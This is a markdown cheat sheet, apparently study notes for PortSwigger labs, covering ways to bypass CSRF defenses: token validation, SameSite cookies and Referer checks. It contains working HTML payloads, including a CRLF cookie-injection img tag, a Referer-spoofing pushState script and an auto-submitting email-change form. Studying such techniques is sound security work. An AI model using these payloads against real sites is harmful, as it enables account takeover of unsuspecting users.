# CSRF (_Cross Site Request Forgery_)

Type: Client-side attack

## CSRF - [Token Validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)

1. Check if Token Validation is mandatory
2. Check if token validation depends of request method (GET, POST)
3. Check if Token validation is tied to session
4. Check if Token validation is tied to none-session cookie by setting cookie before sending request
   ```html
   <img
     src="https://YOUR-SITE%0d%0aSet-Cookie:%20csrfKey=crsfKey%3b%20SameSite=None"
     onerror="document.forms[0].submit();"
   />
   ```
5. Check if Token is not validated from server-side (duplicated token)
   - Change Input token and cookie

## CSRF - [Bypass SameSite Cookie](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)

1. Bypass SameSite=Lax -> override method
   - Change from POST to GET and add parameter `&_method=POST`
2. Bypass SameSite=strict -> redirect
   - using [Path traversal](https://portswigger.net/web-security/file-path-traversal)
3. Bypass SameSite=Lax -> Cookie refresh
   - open new tab and redirect to login, setTimeout to trigger changing email

## CSRF - [Referer-based](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)

1. Check if referer is mandatory (remove referer)
   `Referrer-Policy: no-referrer`
   or
   ```html
   <meta name="referrer" content="no-referrer" />
   ```
2. Check if referer can be bypass
   1. add Referer Policy to `unsafe-url`
   2. push site name to historyState before request
      ```html
      <script>
        history.pushState("", "", "/?YOUR-SITE");
      </script>
      ```

# Template

```html
<form action="https://YOUR-SITE/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="lab@test.com" />
  <input type="hidden" name="csrf" value="test" />
</form>
<script>
  document.forms[0].submit();
</script>
```
